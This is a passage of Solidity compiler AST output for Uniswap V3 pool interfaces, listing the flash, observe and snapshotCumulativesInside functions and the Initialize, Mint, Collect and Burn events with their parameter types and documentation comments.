												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int256",
													"typeString": "int256"
												},
												"typeName": {
													"id": 1762,
													"name": "int256",
													"nodeType": "ElementaryTypeName",
													"src": "5015:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_int256",
														"typeString": "int256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4998:32:3"
									},
									"scope": 1784,
									"src": "4813:218:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1766,
										"nodeType": "StructuredDocumentation",
										"src": "5037:657:3",
										"text": "@notice Receive token0 and/or token1 and pay it back, plus a fee, in the callback\n @dev The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallback\n @dev Can be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling\n with 0 amount{0,1} and sending the donation amount(s) from the callback\n @param recipient The address which will receive the token0 and token1 amounts\n @param amount0 The amount of token0 to send\n @param amount1 The amount of token1 to send\n @param data Any data to be passed through to the callback"
									},
									"functionSelector": "490e6cbc",
									"id": 1777,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "flash",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1775,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1768,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1777,
												"src": "5723:17:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1767,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "5723:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1770,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1777,
												"src": "5750:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1769,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5750:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1772,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1777,
												"src": "5775:15:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1771,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5775:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1774,
												"mutability": "mutable",
												"name": "data",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1777,
												"src": "5800:19:3",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes_calldata_ptr",
													"typeString": "bytes"
												},
												"typeName": {
													"id": 1773,
													"name": "bytes",
													"nodeType": "ElementaryTypeName",
													"src": "5800:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_storage_ptr",
														"typeString": "bytes"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5713:112:3"
									},
									"returnParameters": {
										"id": 1776,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "5834:0:3"
									},
									"scope": 1784,
									"src": "5699:136:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1778,
										"nodeType": "StructuredDocumentation",
										"src": "5841:367:3",
										"text": "@notice Increase the maximum number of price and liquidity observations that this pool will store\n @dev This method is no-op if the pool already has an observationCardinalityNext greater than or equal to\n the input observationCardinalityNext.\n @param observationCardinalityNext The desired minimum number of observations for the pool to store"
									},
									"functionSelector": "32148f67",
									"id": 1783,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "increaseObservationCardinalityNext",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1781,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1780,
												"mutability": "mutable",
												"name": "observationCardinalityNext",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1783,
												"src": "6257:33:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint16",
													"typeString": "uint16"
												},
												"typeName": {
													"id": 1779,
													"name": "uint16",
													"nodeType": "ElementaryTypeName",
													"src": "6257:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint16",
														"typeString": "uint16"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6256:35:3"
									},
									"returnParameters": {
										"id": 1782,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "6300:0:3"
									},
									"scope": 1784,
									"src": "6213:88:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1785,
							"src": "173:6130:3"
						}
					],
					"src": "45:6259:3"
				},
				"id": 3
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol",
					"exportedSymbols": {
						"IUniswapV3PoolDerivedState": [
							1815
						]
					},
					"id": 1816,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1786,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:4"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1787,
								"nodeType": "StructuredDocumentation",
								"src": "71:222:4",
								"text": "@title Pool state that is not stored\n @notice Contains view functions to provide information about the pool that is computed rather than stored on the\n blockchain. The functions here may have variable gas costs."
							},
							"fullyImplemented": false,
							"id": 1815,
							"linearizedBaseContracts": [
								1815
							],
							"name": "IUniswapV3PoolDerivedState",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": {
										"id": 1788,
										"nodeType": "StructuredDocumentation",
										"src": "336:1045:4",
										"text": "@notice Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\n @dev To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing\n the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick,\n you must call it with secondsAgos = [3600, 0].\n @dev The time weighted average tick represents the geometric time weighted average price of the pool, in\n log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\n @param secondsAgos From how long ago each cumulative tick and liquidity value should be returned\n @return tickCumulatives Cumulative tick values as of each `secondsAgos` from the current block timestamp\n @return secondsPerLiquidityCumulativeX128s Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block\n timestamp"
									},
									"functionSelector": "883bdbfd",
									"id": 1800,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "observe",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1792,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1791,
												"mutability": "mutable",
												"name": "secondsAgos",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1800,
												"src": "1403:29:4",
												"stateVariable": false,
												"storageLocation": "calldata",
												"typeDescriptions": {
													"typeIdentifier": "t_array$_t_uint32_$dyn_calldata_ptr",
													"typeString": "uint32[]"
												},
												"typeName": {
													"baseType": {
														"id": 1789,
														"name": "uint32",
														"nodeType": "ElementaryTypeName",
														"src": "1403:6:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint32",
															"typeString": "uint32"
														}
													},
													"id": 1790,
													"length": null,
													"nodeType": "ArrayTypeName",
													"src": "1403:8:4",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_uint32_$dyn_storage_ptr",
														"typeString": "uint32[]"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1402:31:4"
									},
									"returnParameters": {
										"id": 1799,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1795,
												"mutability": "mutable",
												"name": "tickCumulatives",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1800,
												"src": "1481:30:4",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_array$_t_int56_$dyn_memory_ptr",
													"typeString": "int56[]"
												},
												"typeName": {
													"baseType": {
														"id": 1793,
														"name": "int56",
														"nodeType": "ElementaryTypeName",
														"src": "1481:5:4",
														"typeDescriptions": {
															"typeIdentifier": "t_int56",
															"typeString": "int56"
														}
													},
													"id": 1794,
													"length": null,
													"nodeType": "ArrayTypeName",
													"src": "1481:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_int56_$dyn_storage_ptr",
														"typeString": "int56[]"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1798,
												"mutability": "mutable",
												"name": "secondsPerLiquidityCumulativeX128s",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1800,
												"src": "1513:51:4",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_array$_t_uint160_$dyn_memory_ptr",
													"typeString": "uint160[]"
												},
												"typeName": {
													"baseType": {
														"id": 1796,
														"name": "uint160",
														"nodeType": "ElementaryTypeName",
														"src": "1513:7:4",
														"typeDescriptions": {
															"typeIdentifier": "t_uint160",
															"typeString": "uint160"
														}
													},
													"id": 1797,
													"length": null,
													"nodeType": "ArrayTypeName",
													"src": "1513:9:4",
													"typeDescriptions": {
														"typeIdentifier": "t_array$_t_uint160_$dyn_storage_ptr",
														"typeString": "uint160[]"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1480:85:4"
									},
									"scope": 1815,
									"src": "1386:180:4",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								},
								{
									"body": null,
									"documentation": {
										"id": 1801,
										"nodeType": "StructuredDocumentation",
										"src": "1572:771:4",
										"text": "@notice Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\n @dev Snapshots must only be compared to other snapshots, taken over a period for which a position existed.\n I.e., snapshots cannot be compared if a position is not held for the entire period between when the first\n snapshot is taken and the second snapshot is taken.\n @param tickLower The lower tick of the range\n @param tickUpper The upper tick of the range\n @return tickCumulativeInside The snapshot of the tick accumulator for the range\n @return secondsPerLiquidityInsideX128 The snapshot of seconds per liquidity for the range\n @return secondsInside The snapshot of seconds per liquidity for the range"
									},
									"functionSelector": "a38807f2",
									"id": 1814,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "snapshotCumulativesInside",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1806,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1803,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1814,
												"src": "2383:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1802,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2383:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1805,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1814,
												"src": "2400:15:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1804,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2400:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2382:34:4"
									},
									"returnParameters": {
										"id": 1813,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1808,
												"mutability": "mutable",
												"name": "tickCumulativeInside",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1814,
												"src": "2477:26:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int56",
													"typeString": "int56"
												},
												"typeName": {
													"id": 1807,
													"name": "int56",
													"nodeType": "ElementaryTypeName",
													"src": "2477:5:4",
													"typeDescriptions": {
														"typeIdentifier": "t_int56",
														"typeString": "int56"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1810,
												"mutability": "mutable",
												"name": "secondsPerLiquidityInsideX128",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1814,
												"src": "2517:37:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1809,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "2517:7:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1812,
												"mutability": "mutable",
												"name": "secondsInside",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1814,
												"src": "2568:20:4",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint32",
													"typeString": "uint32"
												},
												"typeName": {
													"id": 1811,
													"name": "uint32",
													"nodeType": "ElementaryTypeName",
													"src": "2568:6:4",
													"typeDescriptions": {
														"typeIdentifier": "t_uint32",
														"typeString": "uint32"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2463:135:4"
									},
									"scope": 1815,
									"src": "2348:251:4",
									"stateMutability": "view",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 1816,
							"src": "293:2308:4"
						}
					],
					"src": "45:2557:4"
				},
				"id": 4
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol": {
				"ast": {
					"absolutePath": "github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol",
					"exportedSymbols": {
						"IUniswapV3PoolEvents": [
							1934
						]
					},
					"id": 1935,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1817,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "45:24:5"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": {
								"id": 1818,
								"nodeType": "StructuredDocumentation",
								"src": "71:88:5",
								"text": "@title Events emitted by a pool\n @notice Contains all events emitted by the pool"
							},
							"fullyImplemented": true,
							"id": 1934,
							"linearizedBaseContracts": [
								1934
							],
							"name": "IUniswapV3PoolEvents",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"anonymous": false,
									"documentation": {
										"id": 1819,
										"nodeType": "StructuredDocumentation",
										"src": "196:344:5",
										"text": "@notice Emitted exactly once by a pool when #initialize is first called on the pool\n @dev Mint/Burn/Swap cannot be emitted by the pool before Initialize\n @param sqrtPriceX96 The initial sqrt price of the pool, as a Q64.96\n @param tick The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool"
									},
									"id": 1825,
									"name": "Initialize",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1824,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1821,
												"indexed": false,
												"mutability": "mutable",
												"name": "sqrtPriceX96",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1825,
												"src": "562:20:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint160",
													"typeString": "uint160"
												},
												"typeName": {
													"id": 1820,
													"name": "uint160",
													"nodeType": "ElementaryTypeName",
													"src": "562:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint160",
														"typeString": "uint160"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1823,
												"indexed": false,
												"mutability": "mutable",
												"name": "tick",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1825,
												"src": "584:10:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1822,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "584:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "561:34:5"
									},
									"src": "545:51:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1826,
										"nodeType": "StructuredDocumentation",
										"src": "602:551:5",
										"text": "@notice Emitted when liquidity is minted for a given position\n @param sender The address that minted the liquidity\n @param owner The owner of the position and recipient of any minted liquidity\n @param tickLower The lower tick of the position\n @param tickUpper The upper tick of the position\n @param amount The amount of liquidity minted to the position range\n @param amount0 How much token0 was required for the minted liquidity\n @param amount1 How much token1 was required for the minted liquidity"
									},
									"id": 1842,
									"name": "Mint",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1841,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1828,
												"indexed": false,
												"mutability": "mutable",
												"name": "sender",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1842,
												"src": "1178:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1827,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1178:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1830,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1842,
												"src": "1202:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1829,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1202:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1832,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1842,
												"src": "1233:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1831,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1233:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1834,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1842,
												"src": "1266:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1833,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1266:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1836,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1842,
												"src": "1299:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1835,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "1299:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1838,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1842,
												"src": "1323:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1837,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1323:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1840,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1842,
												"src": "1348:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1839,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1348:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1168:201:5"
									},
									"src": "1158:212:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1843,
										"nodeType": "StructuredDocumentation",
										"src": "1376:493:5",
										"text": "@notice Emitted when fees are collected by the owner of a position\n @dev Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees\n @param owner The owner of the position for which fees are collected\n @param tickLower The lower tick of the position\n @param tickUpper The upper tick of the position\n @param amount0 The amount of token0 fees collected\n @param amount1 The amount of token1 fees collected"
									},
									"id": 1857,
									"name": "Collect",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1856,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1845,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1857,
												"src": "1897:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1844,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1897:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1847,
												"indexed": false,
												"mutability": "mutable",
												"name": "recipient",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1857,
												"src": "1928:17:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1846,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1928:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1849,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1857,
												"src": "1955:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1848,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1955:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1851,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1857,
												"src": "1988:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1850,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "1988:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1853,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1857,
												"src": "2021:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1852,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2021:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1855,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount1",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1857,
												"src": "2046:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1854,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2046:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1887:180:5"
									},
									"src": "1874:194:5"
								},
								{
									"anonymous": false,
									"documentation": {
										"id": 1858,
										"nodeType": "StructuredDocumentation",
										"src": "2074:523:5",
										"text": "@notice Emitted when a position's liquidity is removed\n @dev Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect\n @param owner The owner of the position for which liquidity is removed\n @param tickLower The lower tick of the position\n @param tickUpper The upper tick of the position\n @param amount The amount of liquidity to remove\n @param amount0 The amount of token0 withdrawn\n @param amount1 The amount of token1 withdrawn"
									},
									"id": 1872,
									"name": "Burn",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 1871,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1860,
												"indexed": true,
												"mutability": "mutable",
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1872,
												"src": "2622:21:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1859,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2622:7:5",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1862,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickLower",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1872,
												"src": "2653:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1861,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2653:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1864,
												"indexed": true,
												"mutability": "mutable",
												"name": "tickUpper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1872,
												"src": "2686:23:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_int24",
													"typeString": "int24"
												},
												"typeName": {
													"id": 1863,
													"name": "int24",
													"nodeType": "ElementaryTypeName",
													"src": "2686:5:5",
													"typeDescriptions": {
														"typeIdentifier": "t_int24",
														"typeString": "int24"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1866,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1872,
												"src": "2719:14:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint128",
													"typeString": "uint128"
												},
												"typeName": {
													"id": 1865,
													"name": "uint128",
													"nodeType": "ElementaryTypeName",
													"src": "2719:7:5",
													"typeDescriptions": {
														"typeIdentifier": "t_uint128",
														"typeString": "uint128"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 1868,
												"indexed": false,
												"mutability": "mutable",
												"name": "amount0",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1872,
												"src": "2743:15:5",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
